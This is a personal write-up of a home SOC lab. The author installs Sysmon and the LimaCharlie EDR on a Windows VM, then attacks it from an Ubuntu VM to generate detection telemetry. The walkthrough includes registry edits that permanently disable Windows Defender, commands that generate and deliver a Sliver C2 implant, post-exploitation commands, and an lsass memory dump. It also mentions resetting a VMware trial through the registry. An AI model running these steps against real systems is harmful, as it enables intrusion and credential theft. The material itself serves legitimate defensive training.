<h1>We Are SO Back- LimaCharlie SOC (EDR)</h1>

<h2>Description</h2>
I created a SOC lab again! This time, I used two small vm's (Microsoft 11, and Ubuntu Server 64). I installed LIMA charlie onto the windows vm, after removing all of its firewalls, I used the Ubuntu Server as an attack VM. Deploying and launching a pay load (Sliver surfer) to create incidents and break into the VM. This created various incidents, allowing me to observe, respond, and eventually block. This served as a super valuable experience to get HANDS on SOC training. 
<br />


<h2>Languages and Utilities Used</h2>

- <b>PowerShell</b> 
- <b>CMD</b>
- <b>Sliver_Server</b>
- <b>Windows Defender</b>
- <b>Regedit</b>
- <b>Local Group Policy Editor</b>

<h2>Environments Used </h2>

- <b>Windows 11</b>
 - <b>Ubuntu Server 64</b>

<h2>Lab walk-through:</h2>

<p align="center">
 <b>Setting Up Virtual Machines</b>  </p>
 The initial steps are the easiest. First begin by going to your favorite hypervisor. For today, I used VMware workstation pro. I may have had to go into my personal computer's regedit to find a registry of a forgotten license registry key to reset my trial time- but that is neither here nor there (anymore). It's important to pay attention to the date of when VMware expires. The original lab explains to download a new one after the expiration date, but feel free to ask me for help if you can't use it again. It won't allow you to simply delete, and as mentioned YOU WILL have to pry into your computer's regedit settings to pry it off. I will gladly assist you (it's sneaky).
 
 
 https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html <---- Link to VMware hypervisor
 
https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/   <---- Link to Windows 11 VM

Use the following settings for your Windows VM: 
 
 https://releases.ubuntu.com/22.04.1/ubuntu-22.04.1-live-server-amd64.iso    <---- Direct Download link to Ubuntu Server 
 
 Use the following settings for your Ubuntu Server: 
 
 
 <p align="center"? 
    <b> Priming the Windows VM</b> 
    </p>
 Go to the following link: https://www.guidingtech.com/how-to-completely-disable-windows-defender/ 
 Skip down to #2:"2. How to Permanently Disable Windows Defender Using Regedit" 
 "Alexis, why do we have to permanently disable windows defender using regedit?"
 -Great Q, when you disable windows defender through the settings, it will revert back to the default (Turns back on). And for the sake of generating security logs and breaking in, we need to have it disabled. 
 
Once that's done go into Regedit (look it up in the start menu at the bottom and run it as admin)
 
Look up the start value of each of the following values and set them to 4:

1. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense`
2. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot`
3. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend`
4. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv`
5. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc`
6. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter`

Once that is done, it's time to install Sysmon on our windows VM. A quick overview of what Sysmon is: System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log.
more info on Sysmon here: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon

Launch an administrative powershell and install Sysmon with the following command: 

Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip

Unzip it : Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon

Download SwiftOnSecurity's Sysmon Config: Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml

Now install with: C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml

Validate the install with the following command: Get-Service sysmon64

Then check for the presence of Sysmon logs: Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
^Quick explanation, you are limiting the amount of events to 10, and you are specifying which logs you are looking for. This might be self explanatory but- I always enjoy seeing some explanation of what I am doing and what for. 

Now the next step: Download LimaCharlie EDR from here: https://limacharlie.io/
^Follow the above link and begin filling out the information. Once you are nearly finished, click on Add Sensor. Again, fill out the necessary information. What is super cool about LimaCharlie is that its a free EDR. It comes with a cross platform EDR agent, handles log shipping/ingestion, and has a threat detection engine.

Once you have finished up the settings, it will generate an installer key for you. That key will be important. 

Make sure you download it FROM your WINDOWS VM. When I first went through this lab I did not do this. It will save you 5-10 minutes (mylaugh). 

Open up admin powershell and run the following command: cd C:\Users\User\Downloads

Then run this command: Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe

Now shift into standard command: cmd.exe

Almost done. Copy the installation command key that LimaCharlie generated for you and paste into your terminal. 

--> Paste image 
---> Image of sensor finding your windows VM

<b> Configuring LimaCharlie </b>
Now, lets configur this thing. One the left side of the menu, click "Artifact Collection" and tweak the settings into the following: 
Next to “Artifact Collection Rules” click “Add Rule”

Name: windows-sysmon-logs

Platforms: Windows

Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*

Retention Period: 10

Click “Save Rule”

LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC’s own telemetry, but Sysmon is still a very power visibility tool that runs well alongside any EDR agent.

The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we previously enabled largely depend on Sysmon logs as that is what most of them were written for.

<b> Setting up our Attack VM </b> 
To start, use SSH to log into the attack VM. For this, get into the terminal of the VM and type: ip a
That command is going to give you the IP address of the VM which is important. We need it to SSH into it. 
Open up cmd.exe (I always type it into the lower left search bar of my PC) 

Type: SSH (username)@(ipofVM)

Follow through with the prompts and you are in!

on your VM type: route -n
^This will give us the gateway of the VM^ 

Type this into the vm: sudo nano /etc/netplan/00-installer-config.yaml

We are going to reconfigure our adapter from DHCP to a static IP address. I missed this up several times. I kept making errors with indentations, spacing, and placement. If you want to give up on giving it a static IP address; that is completely okay. 

Switching back to the SSH Session; type: sudo su
^We are dropping into the shell to be able to make admin changes. Also we are about to download Sliver_Server link: https://github.com/BishopFox/sliver/wiki

Type in this command on the SSH window: 

# Download Sliver Linux server binary
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
# Make it executable
chmod +x /usr/local/bin/sliver-server
# install mingw-w64 for additional capabilities
apt install -y mingw-w64

Now create a new directory using the following command: 

# Create and enter our working directory
mkdir -p /opt/sliver

<b> Launching our Payload </b> 

In the SSH Window launch: sliver-server

Now generate the first C2 payload: generate --http [Linux_VM_IP] --save /opt/sliver

Confirm the implant by typing: implants 

Once you get a visual confirmation, type in 'exit' to exit Sliver. 

Type in the following 2 commands: 

cd /opt/sliver
python3 -m http.server 80

Quick explanation: The command python3 -m http.server 80 starts a simple HTTP server on port 80. This means that you can access the current working directory as a web server using your browser. For example, if you have a file called index.html in the current working directory, you can access it by opening http://localhost:80/index.html in your browser.

The -m flag tells Python to run the module http.server as a script. The 80 argument tells the server to listen on port 80.

Switch to the windows VM and launch admin powershell. Type in the following: 
IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe

<b> Starting the Command and Control Session </b> 
Switch back to the Linux VM SSH Session. Terminate the python web server by selecting ctrl+c on the keyboard. 
Relaunch Sliver, and type http. 

Switch back to the Windows VM and execute the C2 payload from its download location: C:\Users\User\Downloads\(payloadname).exe

With this in place, we can now learn about our victim host. 

Type the following commands into sliver: 
info
whoami
getprivs
pwd
netstat
ps -T

<b> Observe EDR Telemetry </b> 
Take the time to observe your findings and logs. More than anything, get used to the amount of noise the logs make. 


MY personal findings and such: It noted that User NT AUTHORITY/SYSTEM was actively listening on the network. Even showed that they were using protocol tcp4 and tcp6. And even I could see the use of the command line and the path of our C2 OUTSTANDING_DISGUISE.exe file took and came from. 

Looking through these logs I used the SANS Hunt Evil poster to help me dig through the information and get a better sense of what normal is: [https://sansorg.egnyte.com/dl/oQm41D67D6](https://sansorg.egnyte.com/dl/oQm41D67D6)

Moving on, I looked for the file from where OUTSTANDING_DISGUISE.exe was running from, and located it.

A search on virus total turned up nothing, and with some research; it is to be expected. Since we just generated the payload ourselves, it’s not likely to have been seen by virustotal before.

This is actually a view of EDR Telemetry+ event logs. I referenced the documentation to get an overview of what everything meant: [https://doc.limacharlie.io/docs/documentation/5e1d6b66e38e0-windows-sensor#supported-events](https://doc.limacharlie.io/docs/documentation/5e1d6b66e38e0-windows-sensor#supported-events)

I made it a point to go through and google the various processes going on. On its own, there is a LOT of noise in normal log views. 

PART 2 

Nowwwwww, I went back to my Sliver session to do some more haxxor stuff. I dumped the lsass.exe process from memory into the sliver C2 server. This triggered an alert on Lima Charlie, and would allow me to set up/create a rule for the event.



<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
